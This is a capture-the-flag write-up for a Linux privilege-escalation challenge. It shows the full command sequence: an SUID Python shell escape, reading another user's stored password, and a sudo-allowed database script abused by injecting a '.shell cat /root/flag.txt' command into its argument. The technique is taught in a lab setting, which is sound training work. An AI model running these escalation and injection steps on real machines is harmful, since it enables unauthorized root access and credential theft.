# Space University of Interior Design - Solution

**Author**: zeyu2001

**Category**: Pwn

We start off as a guest user.

```
$ id
uid=1001(guest) gid=1001(guest) groups=1001(guest)
```

Find that Python has SUID permissions. Refer to https://gtfobins.github.io/gtfobins/python/

```
$ find / -perm /4000 
/bin/umount
/bin/ping
/bin/mount
/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/python3.7
/usr/bin/sudo
```

Use the following command, and observe that our EUID has changed to that of `jared`.

```
$ python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
$ id
uid=1001(guest) gid=1001(guest) euid=1000(jared) groups=1001(guest)
```

Without having the true UID set to that of `jared`, we cannot sudo. But while we were previously unable to view `jared`'s files, we can now view them.

```
$ ls -la jared
total 900
drwx------ 1 jared jared   4096 Jul  8 18:48 .
drwxr-xr-x 1 jared jared   4096 Jul  8 18:39 ..
-rwx------ 1 jared jared    220 Apr 18  2019 .bash_logout
-rwx------ 1 jared jared   3526 Apr 18  2019 .bashrc
-rwx------ 1 jared jared    807 Apr 18  2019 .profile
-rwx------ 1 jared jared 884736 Nov 29  2015 chinook.db
-rwx------ 1 jared jared    117 Jul  8 18:38 creds.txt
-rwx------ 1 jared jared    668 Jul  8 17:58 query_db.py
```

There is an interesting file in `jared`'s directory.

```
$ cat jared/creds.txt
In case I forget my credentials.

jared:iamrich

Thanks to my awesome sysadmin, no one else can see this file!
```

We found `jared`'s credentials. Now, we can `su` to gain full permissions. Observe that the true UID is now that of `jared`.

```
$ id
uid=1001(guest) gid=1001(guest) euid=1000(jared) groups=1001(guest)

$ su jared
iamrich

$ id
uid=1000(jared) gid=1000(jared) groups=1000(jared),27(sudo)
```

Then, leverage `sudo` for an injection vulnerability.

```
$ sudo -l 
Matching Defaults entries for jared on fa9f84013480:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jared may run the following commands on fa9f84013480:
    (ALL) NOPASSWD: /home/jared/query_db.py
```

The payload is:

`sudo ./query_db.py --row "FirstName FROM employees;\n.shell cat /root/flag.txt;\nSELECT FirstName"`

Take a look at `query_db.py` to understand why the payload works.
